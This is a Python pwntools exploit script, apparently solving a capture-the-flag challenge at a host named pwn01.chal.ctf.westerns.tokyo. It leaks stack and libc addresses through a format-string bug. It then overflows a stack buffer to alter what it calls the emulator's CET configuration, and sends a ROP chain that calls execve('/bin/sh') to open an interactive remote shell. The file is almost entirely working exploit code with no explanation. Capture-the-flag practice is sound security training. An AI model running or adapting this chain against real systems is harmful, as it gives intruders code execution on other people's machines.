#!/usr/bin/python3

from pwn import *


def exploit(connection):
    connection.recvuntil(b"Now loading...\n")

    info("Step 1: Leak locations of libc and stack by exploiting the format string vulnerability...")

    connection.recvuntil(b"Input name > ")

    connection.send(b"%p\t" * 9)

    message = connection.recvuntil(b"OK? [y/n] ")
    match = re.match(b"(?P<leak>(((\\(nil\\)|0x[0-9a-f]+))\t){9})\nOK\\? \\[y/n\\] \\Z", message)
    leak = match.group("leak").split(b"\t")
    stack_va = int(leak[5], 0)
    info("stack_va = %012x", stack_va)
    libc_start_main_va = int(leak[8], 0)
    info("libc_start_main_va = %012x", libc_start_main_va)
    libc_va = libc_start_main_va - 0x270b3
    info("libc_va = %012x", libc_va)

    info("Step 2: Modify the CET configuration of the emulator by using the write primitive from the stack buffer overflow...")

    target_va = libc_va + 0x114a74040 + 0x2f50
    info("target_va = %012x", target_va)

    buffer = BytesIO()
    buffer.write(b"y")
    buffer.write(b"A" * 0x2f)
    buffer.write(p64(target_va + 8)[: 7])
    connection.send(buffer.getvalue())

    info("Step 3: Execute shell with ROP sequence from the stack buffer overflow...")

    connection.recvuntil(b"Input message > ")

    buffer = BytesIO()
    buffer.write(p64(libc_va + 0x141ee0))       # xor r10d, r10d ; mov eax, r10d ; ret
    buffer.write(p64(libc_va + 0x141ee1))       # xor edx, edx ; mov eax, r10d ; ret
    buffer.write(p64(libc_va + 0x0e6ce6))       # execve("/bin/sh", r10, rdx)
    buffer.write(b"B" * 0x18)
    buffer.write(p64(stack_va - 0x68)[: 7])
    connection.send(buffer.getvalue())

    connection.recvuntil(b"Bye!\n")

    context.log_level = "info"

    connection.interactive()


context.log_level = "debug"
with remote("pwn01.chal.ctf.westerns.tokyo", 29246) as connection:
    exploit(connection)
